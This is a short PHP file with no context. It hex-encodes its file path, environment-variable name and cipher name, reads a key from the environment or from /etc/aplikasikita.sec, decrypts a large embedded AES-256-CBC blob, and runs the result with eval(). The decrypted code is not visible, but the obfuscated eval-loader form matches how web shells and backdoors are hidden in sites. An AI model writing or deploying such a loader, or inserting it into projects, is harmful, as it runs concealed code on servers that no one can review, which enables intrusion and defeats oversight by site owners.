<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('/Iy0Urjf6NHaxNDYSPKaLw==');

$c=base64_decode(

'Fl1kSySthVJkN7Oidz+qgoyroH5MRxvuU0oNjpsRTWIOCeW6GLxMGAhEErCIviq5flImgwoNRAvV' .
'V6fXl9/9ND+3KjjEjUuKXrm6I6yoa31rt8GlUP3hbktOdfQEmFLNDzePRDPbpCLSYM1/eb2SDvXH' .
'zjTuNPgZIUI64AFJMGttWGyXSEPJpbL1xNAobbwu9sftuyOl2akp2DgRvRarhPRf9TVKoCyUXFEK' .
'AMseFq6WuSRDmjC9jrqlsqtO9gVHEqzUFg2zhT4TVkIXz6CNT8acg7zOktegdhPHmQS0vpjIZXZL' .
'KT6DQ5oDVciF7c8pQj0CBnpaxgtxvRgK+Ooq8Irk+rVqxGury6f2hLfSmN57Ixrt/a+kYdZrIMfj' .
'k9OQp+Jo5Rex9aMq8EFrTSs5ZkPpQYbh7q6Fqo9xrv2aTKPkNQ7q/UCf7s3DI/yiEzmzR6lZ5dDE' .
'0HFY3L7LZCLdajBAwj42abqx1tLnwWnvllTiwkJHEHQGjIoSGMGUikgx6/JURlF/Sc8jEkaPSoKm' .
'6LmbptT0MohpiXjH218WZVjLmlf6N4orHpwuz3uyOdc/z3GfC7prz+vX7h2cWNDU2ADb9XKhkT2v' .
'dksyrT5956mzPnyp4bf4oycrJ3s3XWH4/Uz6ctjre/GOiYbhlb9vi58sScJktFaAXokQ+mFHv8XV' .
'X4YB0i5Nwyt2Nx8yDzJ772aSb/jIxoDbSvaiZ1vyV6w1sgrsE5o/uHOZJCfBb6snWazUFDTz7mXK' .
'UPR66wbnymQngAEni3QNdGsrSh0jy2yhbXuGGxrY6ttKR3gFCbpftsQ3GtOL83RVh4NRRKeQ19Et' .
'7mbDeQ6I0sCztQhZ2e2+NWrSEYn53z+Fowsby63BtK0zzCgYNuccriY8AN7Wo+kaCkMYvgHk10NL' .
'lI/HvFubT3BoQaaBfe4IH478S7ZoDiBKQkybVMET+OB8LlfXdi4DtQEenpCABAA7UDGLwiwMnbWB' .
'LudqKCzCgottAwSEKp+Gg9muTQgEC/EZ5ewdrbHUgvphj+UKi9Q61ehil3yXmy0d8D6fN8iodVPg' .
'QRVs3GUfZpFRC59J9MG2ZnShsmkOj5ysWoSAn6x4mSE4n5trzJWCG2kZGSHbfQN4OjSdzrMf26J3' .
'gR/ey4RMPJ8d4Klzya7FR3qzlXFzrbE8JlkyvcVSTvsbFv+Jo78NsTxMU9JhN/MCkPaCqR1UVRl6' .
'U5VDjlscRt12prAFWAPGQl2RGtUjuZAMl8HGmlwjIUhb4XfOrSsDjtx3m+jhlI8q70BpSJYAx6aM' .
'h0at0a3XFhW5vooQemzYC+bH7KWWVdWd00o3wvATwefzAiHcq1JGqwHkI38FgVzqIT74qwvuSQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

